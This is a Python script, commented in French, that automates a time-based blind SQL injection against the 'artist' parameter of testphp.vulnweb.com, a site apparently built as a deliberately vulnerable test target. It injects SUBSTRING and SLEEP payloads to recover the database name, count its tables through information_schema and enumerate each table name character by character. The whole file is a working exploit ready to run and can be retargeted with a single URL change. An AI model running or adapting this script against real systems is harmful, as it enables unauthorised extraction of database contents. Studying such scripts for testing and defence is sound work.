import requests
import time
import sys

# ---------------------------
# Paramètres Globaux
# ---------------------------
url = "http://testphp.vulnweb.com/artists.php"

# Ensemble de caractères à tester (charset étendu)
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}[]()-=+!@#$%^&*:;/?><,.'\""

# Durée (secondes) du SLEEP pour valider une condition vraie
delay = 5.0

# Longueur maximale à extraire pour éviter les boucles infinies
MAX_LENGTH = 50

# ======================
# 1) FONCTIONS COMMUNES
# ======================

def measure_time(payload):
    """
    Envoie la requête GET avec le param 'artist' = payload,
    et mesure la durée de la réponse.
    """
    params = {"artist": payload}
    start_time = time.time()
    try:
        response = requests.get(url, params=params, timeout=15)
    except requests.RequestException:
        # En cas d'erreur de requête, retourner un temps nul
        return 0.0
    end_time = time.time()
    return end_time - start_time

def check_condition(payload):
    """
    Retourne True si la requête a duré >= delay, False sinon.
    """
    elapsed = measure_time(payload)
    return (elapsed >= delay)

# ======================
# 2) RÉCUPÉRER LE NOM DE LA BDD
# ======================

def get_database_name():
    db_name = ""
    position = 1

    print("[*] Retrieving database name via time-based blind injection...")
    
    while position <= MAX_LENGTH:
        found_char = False
        # Pour chaque caractère possible
        for char in charset:
            # Construction du payload
            # SUBSTRING(DATABASE(), pos, 1) = char => SLEEP(delay)
            payload = f"1 AND IF(SUBSTRING(DATABASE(),{position},1)='{char}', SLEEP({delay}), 0)"
    
            if check_condition(payload):
                db_name += char
                print(f"  [DB] Found character: '{char}' | So far => '{db_name}'")
                found_char = True
                break
    
        if not found_char:
            # On n'a pas trouvé de caractère => fin
            break
        position += 1
    
    print(f"[*] Database name found: '{db_name}'")
    return db_name

# ======================
# 3) COMPTER LE NOMBRE DE TABLES
# ======================

def get_table_count(db_name):
    """
    Retourne le nombre de tables dans la base `db_name` via time-based.
    On va tester count=1,2,...,jusqu'à un max (ex: 50).
    """
    print("[*] Counting tables in the database...")
    
    max_tables = 50
    for count in range(1, max_tables+1):
        # Payload:
        # IF( (SELECT COUNT(*) FROM information_schema.tables
        #      WHERE table_schema='db_name') = count, SLEEP(delay), 0)
        payload = f"1 AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db_name}')={count}, SLEEP({delay}), 0)"
        if check_condition(payload):
            print(f"[*] Table count = {count}")
            return count
    
    print("[!] Impossible de trouver le nombre de tables jusqu'à 50.")
    return 0

# ======================
# 4) OBTENIR LE NOM DE CHAQUE TABLE
# ======================

def get_table_name(db_name, index):
    """
    Récupère le nom de la table d'indice 'index' (0-based)
    depuis information_schema.tables,
    via SUBSTRING + time-based.
    """
    table_name = ""
    position = 1

    # Requête type: SUBSTRING((SELECT table_name FROM information_schema.tables
    # WHERE table_schema='db' LIMIT index,1), pos,1)=char
    print(f"    [*] Retrieving table #{index+1} name...")
    
    while position <= MAX_LENGTH:
        found_char = False
        for char in charset:
            payload = (
                f"1 AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' "
                f"LIMIT {index},1),{position},1)='{char}', SLEEP({delay}), 0)"
            )
            if check_condition(payload):
                table_name += char
                print(f"      -> Found character: '{char}' | So far => '{table_name}'")
                found_char = True
                break
        if not found_char:
            break
        position += 1
    
    print(f"      [TABLE #{index+1}] => '{table_name}'\n")
    return table_name

# ======================
# MAIN
# ======================

if __name__ == "__main__":
    print("[*] Starting Time-Based Blind SQL Injection test...")
    
    # 1) Récupération du nom de la base de données
    database_name = get_database_name()
    if not database_name:
        print("[!] Failed to retrieve the database name. Exiting.")
        sys.exit(1)
    print(f"[+] Database Name: '{database_name}'\n")
    
    # 2) Compter le nombre de tables
    table_count = get_table_count(database_name)
    if table_count == 0:
        print("[!] No tables found or unable to determine table count. Exiting.")
        sys.exit(1)
    print(f"[+] Number of tables in '{database_name}' = {table_count}\n")
    
    # 3) Énumérer chaque table
    print("[*] Enumerating table names...")
    table_names = []
    for i in range(table_count):
        t_name = get_table_name(database_name, i)
        table_names.append(t_name)
    
    print("[+] Tables found:")
    for idx, t in enumerate(table_names, start=1):
        print(f"   {idx}. {t}")
